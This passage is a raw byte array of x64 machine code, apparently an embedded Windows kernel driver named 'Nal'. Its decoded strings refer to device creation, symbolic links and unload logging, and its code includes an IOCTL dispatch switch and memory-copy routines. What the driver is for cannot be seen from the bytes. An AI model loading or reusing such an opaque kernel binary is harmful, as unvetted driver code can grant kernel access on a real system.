		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0xBA, 0x30, 0x06, 0x00, 0x00, 0x33, 0xC9, 0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0xFF, 0x15, 0xB7, 0x21, 0x00,
		0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x13, 0x33, 0xD2, 0x41, 0xB8, 0x30, 0x06, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xE8, 0x6F, 0x07, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x85, 0xC9, 0x74, 0x3E, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x83, 0xB9, 0xA8, 0x03, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD9, 0x74, 0x14, 0x48, 0x8B, 0x89, 0x88, 0x01, 0x00, 0x00, 0xFF, 0x15, 0xE5, 0x21, 0x00, 0x00, 0x83, 0x83, 0xA8, 0x03, 0x00,
		0x00, 0xFF, 0x83, 0xBB, 0xA8, 0x03, 0x00, 0x00, 0x00, 0x75, 0x0B, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x5A, 0x21, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC2, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x48, 0x85, 0xC9, 0x0F, 0x84, 0x92, 0x00, 0x00, 0x00, 0x53, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0xDA, 0x48, 0x8D, 0x91, 0x98, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0xFF, 0x15, 0x8D, 0x21, 0x00, 0x00, 0xBA, 0x04, 0x01, 0x00, 0x00,
		0x41, 0xB8, 0x44, 0x64, 0x6B, 0x20, 0xB9, 0x01, 0x00, 0x00, 0x00, 0x66, 0xC7, 0x44, 0x24, 0x20, 0x04, 0x01, 0x66, 0xC7, 0x44, 0x24, 0x22, 0x04, 0x01, 0xFF, 0x15, 0xF9, 0x20, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x74,
		0x45, 0x48, 0x8D, 0x54, 0x24, 0x30, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x45, 0x33, 0xC0, 0xFF, 0x15, 0x94, 0x21, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x85, 0xC0, 0x78, 0x21, 0x48, 0x8B, 0xD1, 0x48, 0x2B, 0xD9, 0x90, 0x66, 0x66, 0x66, 0x90,
		0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x0F, 0xB6, 0x02, 0x48, 0xFF, 0xC2, 0x84, 0xC0, 0x88, 0x44, 0x13, 0xFF, 0x75, 0xF2, 0x33, 0xD2, 0xFF, 0x15, 0xB2, 0x20, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x5B, 0xC2, 0x00, 0x00, 0xCC, 0xCC,
		0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4C, 0x8B, 0xDC, 0x48, 0x81, 0xEC, 0xF8, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x57, 0x31, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xE0, 0x04, 0x00,
		0x00, 0x48, 0x85, 0xC9, 0x49, 0x89, 0x5B, 0x18, 0x49, 0x89, 0x7B, 0x20, 0x48, 0x8B, 0xF9, 0xBB, 0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x49, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x11, 0x48, 0x8D, 0x0D, 0x14, 0x16, 0x00, 0x00, 0xE8, 0x4F, 0xDF, 0xFF,
		0xFF, 0x48, 0x8B, 0x17, 0x48, 0x8D, 0x42, 0xFF, 0x48, 0x83, 0xF8, 0x07, 0x0F, 0x87, 0x18, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x07, 0xC0, 0xFF, 0xFF, 0x8B, 0x84, 0x81, 0x44, 0x42, 0x00, 0x00, 0x48, 0x03, 0xC1, 0xFF, 0xE0, 0x48, 0x83, 0xC7,
		0x10, 0x74, 0x35, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x57, 0x08, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x91, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x1F, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x93, 0x58, 0x01, 0x00, 0x00, 0xE8, 0x0D,
		0xF6, 0xFF, 0xFF, 0xFF, 0x83, 0xA8, 0x03, 0x00, 0x00, 0x33, 0xDB, 0xE9, 0xDB, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x59, 0x15, 0x00, 0x00, 0xE8, 0xE4, 0xDE, 0xFF, 0xFF, 0xE9, 0xCA, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4F, 0x10, 0x48, 0x85, 0xC9,
		0x74, 0x13, 0x48, 0x8D, 0x51, 0x08, 0x48, 0x8B, 0x09, 0xE8, 0x8A, 0xFE, 0xFF, 0xFF, 0x33, 0xDB, 0xE9, 0xAE, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xCC, 0x14, 0x00, 0x00, 0xE8, 0xB7, 0xDE, 0xFF, 0xFF, 0xE9, 0x9D, 0x01, 0x00, 0x00, 0x48, 0x83,
		0xC7, 0x10, 0x74, 0x0F, 0xE8, 0xD7, 0xFD, 0xFF, 0xFF, 0x33, 0xDB, 0x48, 0x89, 0x07, 0xE9, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x46, 0x14, 0x00, 0x00, 0xE8, 0x91, 0xDE, 0xFF, 0xFF, 0xE9, 0x77, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4F, 0x10,
		0x48, 0x85, 0xC9, 0x74, 0x0F, 0x48, 0x8B, 0x09, 0xE8, 0xEB, 0xFD, 0xFF, 0xFF, 0x33, 0xDB, 0xE9, 0x5F, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xBD, 0x13, 0x00, 0x00, 0xE8, 0x68, 0xDE, 0xFF, 0xFF, 0xE9, 0x4E, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC7,
		0x10, 0x0F, 0x84, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x38, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x57, 0x08, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0xC2, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x07, 0x44, 0x0F, 0xB6, 0x9F, 0x28, 0x01, 0x00,
		0x00, 0x48, 0x8B, 0x97, 0x30, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x87, 0x10, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x87, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8D,
		0x8C, 0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x50, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x87, 0x18, 0x01, 0x00, 0x00, 0x44, 0x88, 0x9C, 0x24, 0x58, 0x02, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x48, 0x02, 0x00, 0x00, 0xE8, 0xB6, 0xFB,
		0xFF, 0xFF, 0x33, 0xDB, 0x89, 0x87, 0x38, 0x01, 0x00, 0x00, 0xE9, 0xC4, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xD2, 0x12, 0x00, 0x00, 0xE8, 0xCD, 0xDD, 0xFF, 0xFF, 0xE9, 0xB3, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC7, 0x10, 0x74, 0x0E, 0xE8, 0x9D,
		0xD0, 0xFF, 0xFF, 0x33, 0xDB, 0x89, 0x07, 0xE9, 0x9F, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x4D, 0x12, 0x00, 0x00, 0xE8, 0xA8, 0xDD, 0xFF, 0xFF, 0xE9, 0x8E, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC7, 0x10, 0x74, 0x2E, 0x48, 0x8D, 0x4C, 0x24, 0x20,
		0x48, 0x8B, 0xD7, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x0A, 0x01, 0x00, 0x00, 0x0F, 0xB6, 0x97, 0x09, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x69, 0xD0, 0xFF, 0xFF, 0x33, 0xDB, 0x88, 0x87, 0x08, 0x01, 0x00, 0x00, 0xEB,
		0x5A, 0x48, 0x8D, 0x0D, 0xB8, 0x11, 0x00, 0x00, 0xE8, 0x63, 0xDD, 0xFF, 0xFF, 0xEB, 0x4C, 0x48, 0x83, 0xC7, 0x10, 0x74, 0x27, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0xD7, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0xC8, 0x00, 0x00, 0x00,
		0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0xFE, 0xD0, 0xFF, 0xFF, 0x33, 0xDB, 0x88, 0x87, 0x08, 0x01, 0x00, 0x00, 0xEB, 0x1F, 0x48, 0x8D, 0x0D, 0x1D, 0x11, 0x00, 0x00, 0xE8, 0x28, 0xDD, 0xFF, 0xFF, 0xEB, 0x11, 0x48, 0x8D, 0x0D, 0xDF, 0x10, 0x00,
		0x00, 0xE8, 0x1A, 0xDD, 0xFF, 0xFF, 0xBB, 0x18, 0x20, 0x6A, 0xC8, 0x48, 0x8B, 0xBC, 0x24, 0x18, 0x05, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x9C, 0x24, 0x10, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xE0, 0x04, 0x00, 0x00, 0xE8, 0xD6, 0x04,
		0x00, 0x00, 0x48, 0x81, 0xC4, 0xF8, 0x04, 0x00, 0x00, 0xC3, 0x66, 0x90, 0x05, 0x40, 0x00, 0x00, 0x51, 0x40, 0x00, 0x00, 0x7E, 0x40, 0x00, 0x00, 0xA4, 0x40, 0x00, 0x00, 0xCD, 0x40, 0x00, 0x00, 0x68, 0x41, 0x00, 0x00, 0x8D, 0x41, 0x00, 0x00,
		0xCF, 0x41, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x38, 0x4C, 0x8B, 0x0D, 0x85, 0x2E, 0x00, 0x00, 0x4C, 0x8B, 0x05, 0x86, 0x2E, 0x00, 0x00, 0x48, 0x8B, 0xD1, 0xB9, 0xF7, 0x00,
		0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x87, 0x1E, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x90,
		0x4C, 0x8B, 0xD9, 0x48, 0x2B, 0xD1, 0x0F, 0x86, 0x9C, 0x01, 0x00, 0x00, 0x49, 0x83, 0xF8, 0x08, 0x72, 0x62, 0xF6, 0xC1, 0x07, 0x74, 0x37, 0xF6, 0xC1, 0x01, 0x74, 0x0C, 0x8A, 0x04, 0x0A, 0x49, 0xFF, 0xC8, 0x88, 0x01, 0x48, 0x83, 0xC1, 0x01,
		0xF6, 0xC1, 0x02, 0x74, 0x0F, 0x66, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x02, 0x66, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x02, 0xF6, 0xC1, 0x04, 0x74, 0x0D, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x04, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x04, 0x4D, 0x8B,
		0xC8, 0x49, 0xC1, 0xE9, 0x05, 0x75, 0x50, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x03, 0x74, 0x14, 0x48, 0x8B, 0x04, 0x0A, 0x48, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x08, 0x49, 0xFF, 0xC9, 0x75, 0xF0, 0x49, 0x83, 0xE0, 0x07, 0x4D, 0x85, 0xC0, 0x75,
		0x07, 0x49, 0x8B, 0xC3, 0xC3, 0x66, 0x66, 0x90, 0x8A, 0x04, 0x0A, 0x88, 0x01, 0x48, 0xFF, 0xC1, 0x49, 0xFF, 0xC8, 0x75, 0xF3, 0x49, 0x8B, 0xC3, 0xC3, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
		0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x49, 0x81, 0xF9, 0x00, 0x08, 0x00, 0x00, 0x73, 0x42, 0x48, 0x8B, 0x04, 0x0A, 0x4C, 0x8B, 0x54, 0x0A, 0x08, 0x48, 0x83, 0xC1, 0x20, 0x48, 0x89, 0x41, 0xE0, 0x4C, 0x89, 0x51, 0xE8, 0x48, 0x8B, 0x44,
		0x0A, 0xF0, 0x4C, 0x8B, 0x54, 0x0A, 0xF8, 0x49, 0xFF, 0xC9, 0x48, 0x89, 0x41, 0xF0, 0x4C, 0x89, 0x51, 0xF8, 0x75, 0xD4, 0x49, 0x83, 0xE0, 0x1F, 0xE9, 0x72, 0xFF, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
		0x66, 0x90, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0xB5, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x0F, 0x18, 0x04, 0x0A, 0x0F, 0x18, 0x44, 0x0A, 0x40, 0x48, 0x81, 0xC1, 0x80, 0x00, 0x00, 0x00, 0xFF, 0xC8, 0x75, 0xEC, 0x48, 0x81, 0xE9, 0x00,
		0x10, 0x00, 0x00, 0xB8, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x0C, 0x0A, 0x4C, 0x8B, 0x54, 0x0A, 0x08, 0x4C, 0x0F, 0xC3, 0x09, 0x4C, 0x0F, 0xC3, 0x51, 0x08, 0x4C, 0x8B, 0x4C, 0x0A, 0x10, 0x4C, 0x8B, 0x54, 0x0A, 0x18, 0x4C, 0x0F, 0xC3, 0x49,
		0x10, 0x4C, 0x0F, 0xC3, 0x51, 0x18, 0x4C, 0x8B, 0x4C, 0x0A, 0x20, 0x4C, 0x8B, 0x54, 0x0A, 0x28, 0x48, 0x83, 0xC1, 0x40, 0x4C, 0x0F, 0xC3, 0x49, 0xE0, 0x4C, 0x0F, 0xC3, 0x51, 0xE8, 0x4C, 0x8B, 0x4C, 0x0A, 0xF0, 0x4C, 0x8B, 0x54, 0x0A, 0xF8,
		0xFF, 0xC8, 0x4C, 0x0F, 0xC3, 0x49, 0xF0, 0x4C, 0x0F, 0xC3, 0x51, 0xF8, 0x75, 0xAA, 0x49, 0x81, 0xE8, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81, 0xF8, 0x00, 0x10, 0x00, 0x00, 0x0F, 0x83, 0x71, 0xFF, 0xFF, 0xFF, 0xF0, 0x80, 0x0C, 0x24, 0x00, 0xE9,
		0xBA, 0xFE, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x74, 0x6F, 0x49, 0x03, 0xC8, 0x49, 0x83, 0xF8, 0x08, 0x72, 0x61, 0xF6, 0xC1, 0x07, 0x74, 0x36,
		0xF6, 0xC1, 0x01, 0x74, 0x0B, 0x48, 0xFF, 0xC9, 0x8A, 0x04, 0x0A, 0x49, 0xFF, 0xC8, 0x88, 0x01, 0xF6, 0xC1, 0x02, 0x74, 0x0F, 0x48, 0x83, 0xE9, 0x02, 0x66, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x02, 0x66, 0x89, 0x01, 0xF6, 0xC1, 0x04, 0x74,
		0x0D, 0x48, 0x83, 0xE9, 0x04, 0x8B, 0x04, 0x0A, 0x49, 0x83, 0xE8, 0x04, 0x89, 0x01, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x05, 0x75, 0x50, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x03, 0x74, 0x14, 0x48, 0x83, 0xE9, 0x08, 0x48, 0x8B, 0x04, 0x0A,
		0x49, 0xFF, 0xC9, 0x48, 0x89, 0x01, 0x75, 0xF0, 0x49, 0x83, 0xE0, 0x07, 0x4D, 0x85, 0xC0, 0x75, 0x07, 0x49, 0x8B, 0xC3, 0xC3, 0x66, 0x66, 0x90, 0x48, 0xFF, 0xC9, 0x8A, 0x04, 0x0A, 0x49, 0xFF, 0xC8, 0x88, 0x01, 0x75, 0xF3, 0x49, 0x8B, 0xC3,
		0xC3, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x49, 0x81, 0xF9, 0x00, 0x08, 0x00, 0x00, 0x73, 0x42, 0x48, 0x8B, 0x44, 0x0A, 0xF8, 0x4C, 0x8B, 0x54,
		0x0A, 0xF0, 0x48, 0x83, 0xE9, 0x20, 0x48, 0x89, 0x41, 0x18, 0x4C, 0x89, 0x51, 0x10, 0x48, 0x8B, 0x44, 0x0A, 0x08, 0x4C, 0x8B, 0x14, 0x0A, 0x49, 0xFF, 0xC9, 0x48, 0x89, 0x41, 0x08, 0x4C, 0x89, 0x11, 0x75, 0xD5, 0x49, 0x83, 0xE0, 0x1F, 0xE9,
		0x73, 0xFF, 0xFF, 0xFF, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x90, 0x48, 0x81, 0xFA, 0x00, 0xF0, 0xFF, 0xFF, 0x77, 0xB5, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48, 0x81, 0xE9, 0x80, 0x00, 0x00, 0x00, 0x0F,
		0x18, 0x04, 0x0A, 0x0F, 0x18, 0x44, 0x0A, 0x40, 0xFF, 0xC8, 0x75, 0xEC, 0x48, 0x81, 0xC1, 0x00, 0x10, 0x00, 0x00, 0xB8, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x4C, 0x0A, 0xF8, 0x4C, 0x8B, 0x54, 0x0A, 0xF0, 0x4C, 0x0F, 0xC3, 0x49, 0xF8, 0x4C,
		0x0F, 0xC3, 0x51, 0xF0, 0x4C, 0x8B, 0x4C, 0x0A, 0xE8, 0x4C, 0x8B, 0x54, 0x0A, 0xE0, 0x4C, 0x0F, 0xC3, 0x49, 0xE8, 0x4C, 0x0F, 0xC3, 0x51, 0xE0, 0x4C, 0x8B, 0x4C, 0x0A, 0xD8, 0x4C, 0x8B, 0x54, 0x0A, 0xD0, 0x48, 0x83, 0xE9, 0x40, 0x4C, 0x0F,
		0xC3, 0x49, 0x18, 0x4C, 0x0F, 0xC3, 0x51, 0x10, 0x4C, 0x8B, 0x4C, 0x0A, 0x08, 0x4C, 0x8B, 0x14, 0x0A, 0xFF, 0xC8, 0x4C, 0x0F, 0xC3, 0x49, 0x08, 0x4C, 0x0F, 0xC3, 0x11, 0x75, 0xAA, 0x49, 0x81, 0xE8, 0x00, 0x10, 0x00, 0x00, 0x49, 0x81, 0xF8,
		0x00, 0x10, 0x00, 0x00, 0x0F, 0x83, 0x71, 0xFF, 0xFF, 0xFF, 0xF0, 0x80, 0x0C, 0x24, 0x00, 0xE9, 0xBA, 0xFE, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66,
		0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x90, 0x48, 0x8B, 0xC1, 0x49, 0x83, 0xF8, 0x08, 0x72, 0x53, 0x0F, 0xB6, 0xD2, 0x49, 0xB9, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x49, 0x0F, 0xAF, 0xD1, 0x49, 0x83, 0xF8, 0x40, 0x72, 0x1E,
		0x48, 0xF7, 0xD9, 0x83, 0xE1, 0x07, 0x74, 0x06, 0x4C, 0x2B, 0xC1, 0x48, 0x89, 0x10, 0x48, 0x03, 0xC8, 0x4D, 0x8B, 0xC8, 0x49, 0x83, 0xE0, 0x3F, 0x49, 0xC1, 0xE9, 0x06, 0x75, 0x39, 0x4D, 0x8B, 0xC8, 0x49, 0x83, 0xE0, 0x07, 0x49, 0xC1, 0xE9,
		0x03, 0x74, 0x11, 0x66, 0x66, 0x66, 0x90, 0x90, 0x48, 0x89, 0x11, 0x48, 0x83, 0xC1, 0x08, 0x49, 0xFF, 0xC9, 0x75, 0xF4, 0x4D, 0x85, 0xC0, 0x74, 0x0A, 0x88, 0x11, 0x48, 0xFF, 0xC1, 0x49, 0xFF, 0xC8, 0x75, 0xF6, 0xC3, 0x66, 0x66, 0x66, 0x90,
		0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x49, 0x81, 0xF9, 0x00, 0x04, 0x00, 0x00, 0x73, 0x30, 0x48, 0x89, 0x11, 0x48, 0x89, 0x51, 0x08, 0x48, 0x89, 0x51, 0x10, 0x48, 0x83, 0xC1, 0x40, 0x48, 0x89, 0x51, 0xD8, 0x48, 0x89, 0x51, 0xE0, 0x49,
		0xFF, 0xC9, 0x48, 0x89, 0x51, 0xE8, 0x48, 0x89, 0x51, 0xF0, 0x48, 0x89, 0x51, 0xF8, 0x75, 0xD8, 0xEB, 0x94, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x48, 0x0F, 0xC3, 0x11, 0x48, 0x0F, 0xC3, 0x51, 0x08, 0x48, 0x0F, 0xC3, 0x51, 0x10, 0x48, 0x83,
		0xC1, 0x40, 0x48, 0x0F, 0xC3, 0x51, 0xD8, 0x48, 0x0F, 0xC3, 0x51, 0xE0, 0x49, 0xFF, 0xC9, 0x48, 0x0F, 0xC3, 0x51, 0xE8, 0x48, 0x0F, 0xC3, 0x51, 0xF0, 0x48, 0x0F, 0xC3, 0x51, 0xF8, 0x75, 0xD0, 0xF0, 0x80, 0x0C, 0x24, 0x00, 0xE9, 0x54, 0xFF,
		0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0x25, 0x52, 0x19, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x90,
		0x48, 0x3B, 0x0D, 0xF1, 0x29, 0x00, 0x00, 0x75, 0x10, 0x48, 0xC1, 0xC1, 0x10, 0x66, 0xF7, 0xC1, 0xFF, 0xFF, 0x75, 0x01, 0xC3, 0x48, 0xC1, 0xC9, 0x10, 0xE9, 0x42, 0xFB, 0xFF, 0xFF, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64,
		0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x55, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x3A, 0x20, 0x49, 0x6F, 0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x20, 0x4E, 0x4F, 0x54, 0x20, 0x63, 0x61,
		0x6C, 0x6C, 0x65, 0x64, 0x3A, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x20, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64,
		0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x55, 0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x3A, 0x20, 0x4C, 0x65, 0x61, 0x76, 0x69, 0x6E, 0x67, 0x2E, 0x2E, 0x2E, 0x20, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
		0x5C, 0x00, 0x3F, 0x00, 0x3F, 0x00, 0x5C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x55, 0x6E, 0x6C, 0x6F, 0x61,
		0x64, 0x3A, 0x20, 0x53, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E, 0x67, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
		0x65, 0x72, 0x41, 0x64, 0x64, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x3A, 0x20, 0x64, 0x6F, 0x6E, 0x65, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64,
		0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x2E, 0x20, 0x20,
		0x53, 0x74, 0x61, 0x74, 0x75, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x78, 0x0A, 0x00, 0xCC, 0x5C, 0x00, 0x44, 0x00, 0x6F, 0x00, 0x73, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00, 0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x73, 0x00, 0x5C, 0x00,
		0x4E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76, 0x65, 0x72, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65,
		0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x2E, 0x20, 0x20, 0x53, 0x74, 0x61, 0x74, 0x75, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x30, 0x78, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x5C, 0x00, 0x44, 0x00, 0x65, 0x00, 0x76, 0x00,
		0x69, 0x00, 0x63, 0x00, 0x65, 0x00, 0x5C, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6C, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x44, 0x72, 0x69, 0x76,
		0x65, 0x72, 0x41, 0x64, 0x64, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x3A, 0x20, 0x65, 0x6E, 0x74, 0x65, 0x72, 0x65, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x4E, 0x61, 0x6C, 0x20, 0x57, 0x69, 0x6E, 0x64,
